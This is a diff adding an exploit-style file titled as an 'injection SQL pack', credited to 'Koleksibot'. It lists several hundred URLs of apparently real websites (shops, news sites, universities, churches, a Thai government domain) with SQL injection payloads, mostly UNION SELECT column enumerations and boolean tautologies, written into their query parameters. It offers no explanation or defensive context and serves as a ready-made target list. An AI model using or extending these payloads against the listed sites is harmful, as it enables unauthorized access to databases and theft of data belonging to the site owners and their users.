@@ -1,0 +1,606 @@
+##############################################################################################
+# Exploit Titre: info Security White . injection SQL pack-24
+# Author [ Discovered BY ] : Koleksibot
+
+#############################################################################################
+
+http://ablrb.net/gallery-details.php?Id=8' and [t] and '1'='1
+http://achromicpoint.com/past-event.php?id=446' and [t] and '1'='1
+http://alarabiacinema.com/acpdall/acpd_local/movie_details.php?mov_id=[t] and 1=1&genre_id=5&director_id=
+http://alist.co.th/event.php?id=1999999.9' union all select 1,[t],3,4,5,6,7,8 and '0'='0
+http://allabroad.us/advice.php?cid=999999.9 union all select 1,2,3,[t]&cat_id=27
+http://alora.info/alora/accueilEn.php?Item=[t]
+http://altepost-ruegen.de/page.php?modul=HTMLPages' and [t] and '1'='1&pid=21
+http://ambica.spectacularsys.com/login.php?username=Archana' or 1=[t] and '1'='1
+http://amdainternational.com/english/news/detailsnews.php?id=[t]
+http://amversailles.free.fr/partition-musicale.php?pid=383569 and 999999.9 union all select 1,2,3,[t],5,6,7,8,9,10,11,12,13,14,15,16,17
+http://angelescitycondos.com/condo_details.php?id=5999999.9' union all select 1,2,[t],4,5,6,7,8 and '0'='0
+http://anita.sk/sk/sortiment.php?skupina_ID=999999.9 union all select [t],2,3,4,5,6,7,8&subskupina_ID=13
+http://antropometri.se/publication.php?id=999999.9' union all select 1,2,[t],4,5,6,7 and '0'='0
+http://archibal-poulin.fr/rubrique.php?r=maison999999.9' union all select 1,2,[t],4 and '0'='0&id=1
+http://arizona.bizhwy.com/category.php?c=23' and [t] and '1'='1
+http://artemistecnologia.com.br/produto.php?id=973999999.9' union all select 1,[t],3,4,5,6,7 and '0'='0
+http://asre-nou.net/php/view.php?objnr=5805' and [t] and '1'='1
+http://atad.ae/productlist.php?id=1' or 1=[t] and '1'='1&name=Building Materials&view=1
+http://aupassportphoto.com.au/category.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9--
+http://aureavalmennus.fi/index.php?page=content&id=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10&parent=1
+http://avalontravelbooks.net/book.php?isbn=1612382282' and [t] and '1'='1
+http://bacrugby.free.fr/arbo/histo/joueur.php?id=999999.9 union all select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,[t],25,26,27,28,29,30
+http://bb-interpack.com/content.php?arti_id=12999999.9' union all select 1,2,[t],4,5,6 and '0'='0
+http://beetrontech.com/product_details.php?id=16' or 1=[t] and '1'='1
+http://bistudiotour.com/artist.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16--
+http://blood.mahasbtc.com/bbdetails.php?bb_id=999999.9' union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 and '0'='0
+http://bowtieoverdrives.com/catalog/catalog.php?Action=GETSUBCAT&CATID=OA2' and [t] and '1'='1
+http://bringsavingstome.com/bstm/main/index.php?action=display&view=sale&sale_id=999999.9 union all select 1,2,3,[t],5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+http://caesar.logiqx.com/php/emulator_game.php?id=mame' and [t] and '1'='1&game=firefox
+http://cai.or.kr/kboard/kboard.php?board=8_member_sub2&act=view&no=999999.9 union all select 1,[t],3,4,5,6,7,8
+http://cecit.es/news.php?id=999999.9 union all select 1,2,3,[t],5,6,7,8,9,10
+http://chansonplus.free.fr/paroles/paroles_text.php?id=999999.9 union all select 1,2,3,4,5,6,[t],8,9,10
+http://chunchin.com.cn/product_list.php?cid=[t] and 1=1
+http://cl.prvademecum.com/producto.php?producto=[t]
+http://classickorea.co.kr/v8/cs_score/score_view.php?score_id=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+http://claudinne.com/evento.php?id=[t]
+http://cordoganclark.com/newsitem.php?id=999999.9 union all select 1,2,3,[t],5,6
+http://cowbellexports.com/products.php?cat_id=4999999.9' union all select [t],2,3 and '0'='0
+http://csmju.jowave.com/read_news.php?id=999999.9' union all select 1,[t],3,4,5,6,7,8,9,10,11 and '0'='0
+http://cwahi.concordia.ca/sources/artists/displayArtist.php?ID_artist=999999.9' union all select 1,[t],3,4,5,6,7,8,9 and '0'='0
+http://cybersansar.com/thumbnail_view.php?gal_id=1275' and [t] and '1'='1&image_id=26449
+http://denisbarberot.free.fr/montagne/detail.php?id=[t]
+http://directory.cbcew.org.uk/search.php?pageType=groupView&ID=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34
+http://dnis.org/print_interview.php?interview_id=131999999.9' union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 and '0'='0
+http://ecobon.free.fr/boutique//achat/index.php?id=999999.9 union all select 1,[t]--
+http://edmazur.com/game/item.php?id=15' and [t] and '1'='1
+http://eirc-icai.org/contactus.php?Mode=KASBA' and [t] and '1'='1
+http://eminent.cz/autor.php?aut_id=[t]
+http://endocaremedicalsystems.com/product_detail.php?product_id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
+http://eng.hdgd.org/board/view_topview.php?table=board&no=999999.9 union all select 1,2,3,4,5,6,7,8,9,10,11,[t],13,14,15,16,17,18&top_type=7&section=C1&section_child=A03
+http://epaper.dailyk2.com/index.php?pid=4&eid=1' and [t] and '1'='1&nid=1&tnid=9041&date=
+http://epicure-wines.com/products.php?idioma=eng' and [t] and '1'='1&id_c2=34
+http://findingaids.cjh.org/?pID=431106' or 1=[t] and '1'='1
+http://fireking.ae/news.php?id=[t]
+http://flashlifeldn.com/product.php?product_id=999999.9 union all select [t],2--
+http://foncalor.org/blog_post.php?id=289 or 1=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14--
+http://fowlergc.com/portfolio-detail.php?proj_id=7999999.9' union all select 1,2,[t],4 and '0'='0
+http://fran.cornu.free.fr/affichage/affichage_nom.php?id_espece=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32
+http://freshersnews.co.in/job_details.php?id=1281999999.9' union all select 1,2,3,4,[t],6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 and '0'='0
+http://fzjiangmin.com/productlist.php?id=[t]
+http://games.chruker.dk/eve_online/item.php?type_id=3748 and [t] and 1=1
+http://ggcf.or.kr/pages/board/view.asp?MU_IDX=49&BOARD_IDX=2153 or 1=[t] and 1=1&BOARD=503
+http://glcoop.315ii.com/love.php?id=999999.9 union all select 1,2,3,[t],5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32
+http://globeksa.com/who-we-are.php?id=10' and [t] and '1'='1
+http://gvlabs.com/festivalmanager/mshsaa/src/more_details.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31
+http://healthglows.net/books.php?id=[t]
+http://hg-nic.us/merchandise/index.php?cat=999999.9 union all select [t]
+http://ica-arab.com/en/board.php?id=1999999.9' union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 and '0'='0&?mid=2&msid=66
+http://image-tur.ru/tips.php?id=999999.9' union all select 1,[t],3,4,5,6,7,8 and '0'='0
+http://immune-tech.com/customerservice.php?id=1 and [t] and 1=1&title=Plasmid Production
+http://inklingo.com/product.php?productId=17' or 1=[t] and '1'='1
+http://inks-etc.com/Brother_Design/brother_inkdesign.php?ID=24999999.9' union all select 1,2,3,4,5,[t],7,8,9,10,11,12,13,14 and '0'='0
+http://italdecorltd.com/catalog/main.php?cat_id=999999.9' union all select 1,2,3,4,5,6,[t],8,9,10,11,12,13 and '0'='0
+http://iuppiteredizioni.it/site/art.php?id=[t]
+http://jldmlibrary.aup.edu.ph/subcontent.php?id=999999.9 union all select 1,[t],3,4,5
+http://kaichuangji.com/productlist.php?id=126 or 1=[t] and 1=1
+http://kansascitynova.org/single-event.php?id=8' and [t] and '1'='1
+http://kcfl.kyungwon.ac.kr/board/board.html?table=down&mode=read&idx=999999.9 union all select 1,2,[t],4,5,6,7,8,9&page=1&category=total
+http://kedem.com/brands.php?id=13999999.9' union all select 1,2,3,4,5,6,[t],8,9,10,11,12 and '0'='0
+http://konyvtar.uni-pannon.hu/doktori/bovebb.php?id=371 or 1=[t] and 1=1
+http://ladp.free.fr/portail/articles.php?id=999999.9 union all select 1,[t]
+http://lampefuneralhome.com/details.php?id=102 or 1=[t] and 1=1
+http://ledesmaarms.com/product.php?sku=Model 3U' or 1=[t] and '1'='1
+http://lindafranz.com/product.php?productId=21' and [t] and '1'='1
+http://litebible.com/readbible.php?id=999999.9 union all select 1,[t],3
+http://lits.ae/bcgas/photogallery.php?id=999999.9 union all select 1,2,3,[t]
+http://louiswassermanandassociates.com/publications.php?id=999999.9 union all select 1,2,3,4,5,6,7,[t],9,10
+http://m2.ithope.kr/bbs/bbs_view.php?no=999999.9 union all select 1,[t],3,4,5,6&page=1
+http://magiciensdelaterre.fr/artistes.php?id=999999.9 union all select 1,2,[t],4
+http://mahaloheatingandairconditioning.com/resources.php?id=60' and [t] and '1'='1
+http://makeartwithpurpose.net/projects.php?id=999999.9 union all select 1,[t]
+http://mcostandi.free.fr/index.php?action=displaycat&catid=999999.9 union all select [t],2,3,4,5
+http://microtekusa.com/products.php?KindID=3&ID=[t]
+http://mikimotocosmetics-hk.com/product_list.php?id=6999999.9' union all select 1,2,3,4,5,[t],7,8,9,10,11 and '0'='0
+http://minutesemeiotic.org/home.php?id=[t] and 1=1
+http://mistraltv.fr/boutique_achat.php?id_produit=5999999.9' union all select 1,2,3,4,[t],6,7,8,9,10 and '0'='0
+http://motocollants.free.fr/store/achat/index.php?id=999999.9 union all select 1,[t]
+http://multimedia.dna.fr/webdujour/lire_art.php?id=[t]
+http://mumnmematernity.com.au/store.php?cat_id=6999999.9' union all select 1,2,3,4,[t],6,7 and '0'='0
+http://nagoya.catholic.jp/shoukyouku_detail.php?id=54 and [t] and 1=1
+http://nawak.seb.free.fr/fiche_article.php?id_art=999999.9 union all select 1,2,[t],4,5
+http://neurology.ae/disorder_details.php?ID=999999.9 union all select 1,[t],3,4,5
+http://neurosurgerylnh.com/p_events_details.php?id=999999.9' union all select 1,2,3,4,[t],6,7,8,9,10,11 and '0'='0
+http://news.ssk.in.th/ssk1/view.php?id=5953999999.9' union all select 1,2,3,4,[t],6,7,8,9,10,11,12,13,14 and '0'='0
+http://notausgang-sonthofen.de/news_cats.php?cat_id=17' and [t] and '1'='1
+http://nzfood.com.my/productinfo.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8
+http://oemparts.net/product/supplier_list.php?id=102' and [t] and '1'='1
+http://open.dmzj.com/xianxia/cartoon.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--
+http://oriwiki.com/showPub.php?BookID=999999.9 union all select 1,[t],3,4,5,6
+http://paroisse-saint-florent.com/galeries-photos-evenements-eglise.php?code=999999.9' union all select 1,[t],3 and '0'='0
+http://php88.free.fr/bdff/image_film.php?ID=999999.9 union all select 1,[t],3,4,5,6,7,8,9--
+http://pouptempo.com/hotsite.php?id=14246 or 1=[t] and 1=1
+http://prithipura.org/main.php?area_id=999999.9 union all select 1,2,[t],4
+http://projetoquem.com.br/index.php?lang=pt-br&menu=1' and [t] and '1'='1&submenu=124&detalhe=&detalhe=&detalhe=&detalhe=&detalhe=&detalhe=&detalhe=&detalhe=&detalhe=&detalhe=&detalhe=&detalhe=&detalhe=TxtBiblio
+http://quakechampions.cz/index.php?NewsCAT=cVOD' and [t] and '1'='1
+http://registry.whitecolumns.org/view_artist.php?artist=25467' and [t] and '1'='1
+http://rena-metro.com/category.php?cid=999999.9 union all select [t]
+http://retromoderndesign.com/sold.php?id=999999.9 union all select [t],2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--
+http://revueeducationformation.be/include/download.php?idRevue=999999.9' union all select 1,[t],3,4 and '0'='0&idRes=10
+http://rh.groupe-menara.com/album.php?id=8' and [t] and '1'='1
+http://rubettes.free.fr/biodetail.php?id=999999.9 union all select 1,2,3,4,5,[t],7
+http://s460014380.online.de/new/reisebericht.php?id=999999.9 union all select 1,[t],3,4
+http://sahakorn.excise.go.th/old_sahakorn/news.php?type=06' and [t] and '1'='1
+http://sails.corsairs.network/bookPage.php?id=10028999999.9' union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 and '0'='0
+http://sdyc.or.kr/modules/bbs/bbsView.php?id=[t] and 1=1&code=bbs_board
+http://seawardkayaks.com/read_news.php?newsID=151999999.9' union all select 1,[t],3,4 and '0'='0
+http://seouluhak.com/kboard/kboard.php?board=earlyabroad&act=view&no=999999.9 union all select 1,[t],3,4,5,6,7,8,9--
+http://sierrac.free.fr/game.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+http://skylink-phones.ru/acs.php?id=999999.9 union all select 1,[t],3,4,5--
+http://slyelectronics.com/productdetails.php?prodID=999999.9 union all select 1,2,3,4,[t]
+http://sscc-tennis.info/view_entry.php?id=999999.9 union all select [t],2,3,4,5,6,7,8,9,10,11,12&area=3&day=1&month=9&year=2016
+http://stats.catchitkansas.com/report_trackfield-game_results.php?game_id=144741999999.9' union all select 1,2,3,4,[t],6,7,8,9,10 and '0'='0
+http://supergriptires.ca/store.php?cat_id=98&lastcat_id=1' and [t] and '1'='1
+http://szdefense.com/product.php?bid=[t]
+http://tellusmore.net/laredotx/pollyadams/pollyadams.php?id=10835' and [t] and '1'='1
+http://testphp.vulnweb.com/listproducts.php?cat=999999.9 union all select 1,2,3,4,5,6,7,8,9,10,[t]
+http://thecrankshopvt.com/product_info.php?cPath=21_23&products_id=3177 or 1=[t] and 1=1
+http://throwthings.com/item.asp?id=[t]
+http://tignon.andre.free.fr/report.php?id=999999.9 union all select [t]
+http://trade-contacts.de/index.php?modus=artview&id=[t] and 1=1
+http://trif.uz/articles.php?cat=1999999.9' union all select [t],2 and '0'='0
+http://ultraviewcorp.com/displayproduct.php?cat_id=999999.9 union all select 1,2,3,4,5,6,7,8,9,10,11,[t],13,14,15,16,17,18--
+http://uy.prvademecum.com/producto.php?producto=[t]
+http://visithaltonhills.ca/LocalRetail/Localretail.php?id=16999999.9' union all select 1,2,3,4,5,[t],7,8 and '0'='0
+http://voilier.tabasco.free.fr/article.php?ID_ARTICLE=999999.9 union all select [t],2,3
+http://wasnbrett.de/game.php?id=999999.9 union all select 1,2,[t]
+http://westdragongroup.com/listing.php?cat_id=91' and [t] and '1'='1
+http://whiskibar.co.uk/food-drink.php?id=38 or 1=[t] and 1=1
+http://wisconsin.bizhwy.com/category.php?c=15' and [t] and '1'='1
+http://wow.uscgaux.info/content.php?unit=R-DEPT&category=WHATSNEW' and [t] and '1'='1
+http://www.aandrremovals.com/blog-detail.php?id=5999999.9' union all select 1,[t],3,4,5,6,7 and '0'='0
+http://www.abyssplongee.be/content.php?id=[t]
+http://www.ac-aesthetics.com/store/product.php?id=9 and [t] and 1=1
+http://www.acslot.com/acs.php?id=36' and [t] and '1'='1
+http://www.adabroker.com.tr/urunler.php?id=6 or 1=[t] and 1=1
+http://www.adirondacknationals.com/index.php?page=[t] and 1=1
+http://www.airporttrolley.net/productlist.php?id=999999.9 union all select [t],2,3,4,5,6,7,8,9,10,11,12,13
+http://www.alaskabba.com/associate.php?id=88999999.9' union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 and '0'='0
+http://www.all4dog.com/en/dog.php?id=9' or 1=[t] and '1'='1
+http://www.alldiecast.us/diecast_car.php?id=999999.9 union all select 1,2,3,4,5,6,7,8,9,10,11,12,13,[t],15,16,17,18,19,20
+http://www.alpiseuropean.com/gallery.php?id=[t]&gallery=3
+http://www.amanda-nylons.com/index.php?pageID=3 or 1=[t] and 1=1
+http://www.ampak.com.tw/tw/product_list.php?cid=[t] and 1=1
+http://www.amptek-es.com/index.php?lang=0 or 1=[t] and 1=1&aptd=7
+http://www.andersonkarts.com/specsheet.php?krt_id=1999999.9' union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14,15,16,17 and '0'='0
+http://www.anitaroddick.com/readmore.php?sid=999999.9 union all select 1,2,3,[t],5,6,7,8,9--
+http://www.antigodailyjournal.com/index.php?ID=999999.9 union all select 1,2,3,4,5,[t],7,8,9,10,11,12
+http://www.antkh.com/project/kfour/Products.php?CatID=12 or 1=999999.9 union all select [t],2,3,4,5,6,7,8,9,10,11,12--
+http://www.antroposmoderno.com/antro-articulo.php?id_articulo=152' and [t] and '1'='1
+http://www.ardic.be/doc.php?id=sf10&tid=4&docid=[t]&page=1&site=1
+http://www.artstatements.com/artist_art.php?id=[t]
+http://www.artthemis.be/gr5/news_afficher.php?id=999999.9 union all select 1,[t],3,4
+http://www.asianaoffshore.co.th/content.php?arti_id=12999999.9' union all select 1,2,[t],4,5,6 and '0'='0
+http://www.astmc.com/category.php?CatID=175' and [t] and '1'='1
+http://www.astorytoshare.com/lovestory.php?id=999999.9 union all select 1,[t],3,4,5--
+http://www.atkinsonassoc.co.uk/newsDetail.php?id=43' and [t] and '1'='1
+http://www.atlanticenergy.ma/page.php?id=1' or 1=[t] and '1'='1
+http://www.auroch-worldwide.com/pagesn.php?id=999999.9 union all select 1,2,3,4,5,6,7,8,9,[t],11,12,13,14,15,16,17,18,19,20,21,22
+http://www.autodokter.be/home.php?page=21' and [t] and '1'='1
+http://www.autosignalizacija.lv/main.php?id="999999.9' union all select 1,2,3,4,5,6,7,[t],9,10,11,12,13,14,15,16,17,18,19,20,21 and '0'='0
+http://www.ayurvedaitalia.it/post.php?id=67999999.9' union all select 1,[t],3,4,5,6,7,8,9 and '0'='0
+http://www.azgranitecreations.com/products.php?type=marble999999.9' union all select [t],2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 and '0'='0
+http://www.baltimoreeats.com/restaurant.php?id=6097' and [t] and '1'='1
+http://www.banjahero.com/category.php?cid=12' and [t] and '1'='1
+http://www.baotongdoors.com.cn/productlist.php?id=999999.9 union all select 1,2,3,4,[t],6,7,8,9,10,11
+http://www.barkuronline.com/moredetails.php?id=219' or 1=[t] and '1'='1
+http://www.bcspecialtyfood.ca/company-details.php?companyID=250' and [t] and '1'='1
+http://www.bearings-industry.com/search/?login=Merstashy999999.9' union all select 1,2,3,4,5,6,7,[t],9,10,11,12,13,14 and '0'='0
+http://www.biblemagazine.com/home/view_art.php?id_pag=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12--
+http://www.birthvillage.com/browse-baby-names.php?letter=Alu' and [t] and '1'='1
+http://www.bouroullec.com/view_projets_detail_new.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11&r=false
+http://www.brandsdaddy.com/product-details.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10
+http://www.brudirect.com/news.php?id=999999.9' union all select 1,[t],3,4,5,6,7,8,9,10,11,12 and '0'='0
+http://www.bu.edu.bd/sadiq/post.php?id=18 or 1=999999.9 union all select 1,2,3,[t],5,6,7,8,9
+http://www.c2-int.com/news-full.php?id=999999.9 union all select 1,2,3,[t],5,6,7,8,9,10,11,12,13,14
+http://www.camera.com.bd/index.php?view=news_detail&id=8' or 1=[t] and '1'='1
+http://www.cangoaveiculos.com.br/site/view/detail.php?id=206' or 1=[t] and '1'='1
+http://www.carenepal.org/event.php?id=27999999.9' union all select 1,[t],3,4,5 and '0'='0
+http://www.cargpsaustralia.com.au/details.php?ProdID=99' and [t] and '1'='1
+http://www.carriedawaydesigns.net/store.php?cat=[t]
+http://www.casacrystal.com/category.php?cid=[t]
+http://www.cctnp.fr/agenda/details.php?id=5999999.9' union all select 1,2,3,4,5,[t],7,8,9,10,11,12,13 and '0'='0
+http://www.cefisioterapico.com/show.php?id_pagina=[t] and 1=1
+http://www.certiferme.com/blog/index.php?id=[t]
+http://www.cetice.u-psud.fr/cas_clinique_cancero/cas.php?cid=86' and [t] and '1'='1
+http://www.chadia-tours.com/details.php?offerID=11 and [t] and 1=1&themeId=2
+http://www.chanimc.org/bioshow/detail_menu.php?id=6' and [t] and '1'='1
+http://www.china-hearingaid.com/read.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31
+http://www.chosen.co.th/products/review.php?id=76' and [t] and '1'='1
+http://www.cimol.ind.br/2016/noticias/show.php?id=999999.9 union all select 1,2,[t],4,5
+http://www.cineclubvic.com/detall_peli.php?id=332' and [t] and '1'='1
+http://www.cineweb.com.br/festivais/festival.php?id_festival=[t] and 1=1&page=2
+http://www.clemcoindustries.com/products_showitem_clemco.php?item_id=999999.9 union all select 1,2,3,4,[t],6,7,8,9
+http://www.cliptvnews.com.br/amplia_audio.php?id_noticia=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14,15,16,17
+http://www.cocolotus.com/item.php?iid=102 and [t] and 1=1
+http://www.coda-continuum.com/product/product.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13
+http://www.coda.cc/product/product.php?id=[t] and 1=1
+http://www.colegiogibran.com.br/news.php?id=999999.9 union all select 1,[t],3
+http://www.collecti.cc/mobilidees/wakka.php?wiki=BazaR&vue=exporter&id=[t]
+http://www.compointsvc.com/board/board.html?table=notice&mode=read&idx=999999.9 union all select 1,2,[t],4,5,6,7,8,9&page=3&category=total
+http://www.comwave.edu.pk/download.php?id=999999.9 union all select [t],2,3
+http://www.congresintaref.org/index.php?cont_id=4999999.9' union all select 1,2,3,4,[t],6,7,8,9,10 and '0'='0&lang=en
+http://www.consorziogardaidro.it/home.php?id=108&lingua=1 or 1=[t] and 1=1&posizione=d
+http://www.costadolci.it/prodotti.php?IdCat=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11&IdSottoCat=&offset=4&RecordPerPagina=4&qRicerca=&Regione=&tc=si
+http://www.cowboysofcolor.org/profile.php?ID=999999.9 union all select 1,2,[t],4
+http://www.creationlightship.com/product_details.php?prodID=[t] and 1=1
+http://www.creekside-gardens.com/product_details.php?id=173 or 1=[t] and 1=1
+http://www.csretail.co.th/products/product_mf.php?id=74999999.9' union all select 1,[t],3 and '0'='0
+http://www.cubaluxuryrent.com/gallery.php?id=ATLANTIC_penthouse' and [t] and '1'='1
+http://www.cubiceducationbd.com/index.php?id=999999.9' union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14 and '0'='0
+http://www.czga.ro/pagina.php?id=10999999.9' union all select 1,2,[t],4,5,6,7 and '0'='0
+http://www.daiwafurniture.com/index.php?pageID=26' and [t] and '1'='1
+http://www.dalesman.uk.com/products.php?prodID=A60&suppID=46 and 999999.9 union all select 1,[t],3,4--
+http://www.damico.co.za/staff_profile.asp?STAFF_ID=999999.9 union all select 1,[t],3,4,5
+http://www.dashele-designs.co.uk/ViewItem.php?ItemID=83' and [t] and '1'='1
+http://www.dayacom.com.tw/product_01.php?prod_item_id=999999.9 union all select 1,2,[t],4,5
+http://www.deluxevoyages.ma/alaune.php?id=1' or 1=[t] and '1'='1
+http://www.demuth.com.br/segmentos/index.php?id=999999.9 union all select [t],2,3,4,5,6,7,8,9,10
+http://www.denantique.com/product/view_product.php?id=999999.9 union all select 1,2,3,4,5,6,7,[t]
+http://www.derekfell.net/display.php?CatID=999999.9 union all select [t]
+http://www.designbuildermaroc.com/detail-actualite.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12
+http://www.displaysbyrioux.com/product.php?cat_id=999999.9 union all select 1,2,[t],4,5,6--
+http://www.dreamrivershinhan.com/zb/view.php?uid=[t]&startPage=1&boardid=zb_notice&category=��ü
+http://www.drewapenaar.nl/project.php?id=[t]
+http://www.drinkey.net/locale.php?id=999999.9' union all select 1,2,3,4,5,6,7,8,9,10,11,12,[t],14 and '0'='0
+http://www.durbanview.co.za/index.php?id=3' and [t] and '1'='1
+http://www.ealformation.com/actualite.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8
+http://www.eastendcf.org/index.php?cat=9' and [t] and '1'='1
+http://www.easton.com.tw/ab.php?id=101' and [t] and '1'='1
+http://www.echn.com.tw/story.php?id=999999.9' union all select 1,[t],3,4,5,6 and '0'='0
+http://www.editions-fournel.fr/catalogue/pages/liste_livre.php?CID=999999.9 union all select 1,[t],3
+http://www.editionsmosquito.com/festival-bd-grenoble/auteurFestival.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10
+http://www.eickemeyerveterinary.com/product_details.php?product_id=111&cat=126' or 1=[t] and '1'='1
+http://www.eleanorlevie.com/gallery-detail.php?cat=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14&ID=0
+http://www.enbkorea.com/freeboard/board/view.html?code=board&page=1&main_no=999999.9 union all select 1,2,3,[t],5,6,7,8,9,10,11,12--&dep_no=AAAA&keyword=
+http://www.endorphinmag.fr/detail_news.php?i=999999.9 union all select 1,2,[t],4
+http://www.envi.cz/print.php?ida=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12&ids=7
+http://www.eramds.com/product_details.php?cid=2' and [t] and '1'='1
+http://www.esperiakavala.gr/index.php?lang=gr' and [t] and '1'='1&sec=13&ctg=23
+http://www.exceltact.com.hk/product_details.php?id=[t] and 1=1
+http://www.eyusei.com/cookteach/cookdetail.php?cooking_id=[t]
+http://www.facop.ma/factualite.php?id=999999.9 union all select [t],2,3,4,5,6,7,8--
+http://www.fantco.com/products-category.php?cid=[t]
+http://www.fc1592.uh.cz/index.php?page=kronika' and [t] and '1'='1&id=400
+http://www.feldsieper.de/detail.php?id=247' and [t] and '1'='1
+http://www.fenix951.com.ar/nuevo_2013/opinion.php?id=999999.9 union all select [t],2,3,4,5
+http://www.fibertech.jp/news.php?id=[t]
+http://www.fimmgmessina.org/index.php?news=999999.9 union all select [t]
+http://www.floorball.org/ottelukooste.asp?ottelu_id=999999.9 union all select [t],2
+http://www.foot-occitanie.com/fiches/effectif18.php?id=802681999999.9' union all select 1,2,[t],4,5,6,7,8,9,10 and '0'='0
+http://www.formosatimes.com.tw/news.php?type=999999.9 union all select 1,[t],3,4,5,6,7,8--
+http://www.foyerscadieux.com/products.php?type=pellets' or 1=[t]--
+http://www.francoisebollackarchitects.com/projects/index.php?cid=13' and [t] and '1'='1
+http://www.freescience.info/Computer%20Science.php?id=[t] and 1=1
+http://www.friul.net/dizionario_nazzi/nazzi_friulano_italiano.php?id=999999.9 union all select [t],2&x=1
+http://www.fuoxin.com/productlist.php?fid=[t] and 1=1
+http://www.garnersferry.com/viewPhoto.php?id=999999.9 union all select 1,[t],3,4
+http://www.gdecarli.it/php/circuit.php?var1=[t]&var2=2
+http://www.gentechgenerators.com.au/store/viewItem.asp?idProduct=[t]
+http://www.georgetubeamps.com/index.php?lang=0 or 1=[t] and 1=1&aptd=1&id_subcat=63
+http://www.ghanatimber.org/gallery.php?id=3' and [t] and '1'='1
+http://www.giglok.com/news-detail.php?ID=999999.9 union all select [t],2,3,4,5,6,7,8,9,10,11,12,13,14,15
+http://www.gingarts.com/photos.php?id=999999.9 union all select 1,2,[t],4,5--
+http://www.glbimr.org/event.php?id=55' and [t] and '1'='1
+http://www.gondoladigital.com/noticia.php?ID_NOTICIA=999999.9 union all select 1,[t],3,4,5,6,7,8,9
+http://www.greetsiel.org/hotels/hotel.php?id=17' and [t] and '1'='1
+http://www.guiadaembalagem.com.br/gloss_action.php?id_glossario=9999999.9' union all select [t],2,3,4 and '0'='0
+http://www.guiafala.com.br/festival.php?idFest=1046' and [t] and '1'='1
+http://www.gurumama.ca/product-list.php?cat_id=999999.9 union all select [t]
+http://www.hadsadincatering.com/content.php?arti_id=15999999.9' union all select 1,2,[t],4,5,6 and '0'='0
+http://www.healeywerks.com/gallery/gallery.php?cid=1 and 999999.9 union all select [t],2,3,4,5,6,7,8,9,10,11,12--
+http://www.heimanis.lv/prod.php?cat=[t] and 1=1
+http://www.helloclan.eu/bfv/stats/game.php?id=[t] and 1=1
+http://www.hermanusweddings.co.za/listings.php?id=53999999.9' union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14,15,16,17 and '0'='0&category=florists
+http://www.hifi-antique.com/store.php?cat_id=113' or 1=[t] and '1'='1
+http://www.highteen.com.cn/productlist.php?fid=[t] and 1=1
+http://www.himmel.com.ph/product-details.php?prodid=19' and [t] and '1'='1
+http://www.hk-waitat.com/web/product.php?cat=60 or 1=999999.9 union all select 1,2,[t]--
+http://www.hkipas.com/en/event-detail.php?id=[t]
+http://www.horses.sk/pk/karta.php?cislo=[t]
+http://www.hostmost.com.hk/en/product.php?bid=1' or 1=[t] and '1'='1&page=7
+http://www.hotelmetdelhi.com/pages.php?id=84' and [t] and '1'='1
+http://www.houellebecq.info/poplivre.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+http://www.huisverloo.be/subpage.php?page_ID=2&subpage_ID=999999.9 union all select 1,2,3,4,5,6,7,8,9,10,[t],12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+http://www.iampmc.com/content.php?arti_id=19999999.9' union all select 1,2,[t],4,5,6 and '0'='0
+http://www.iap.unibe.ch/publications/publication.php?lang=en or 1=[t] and 1=1
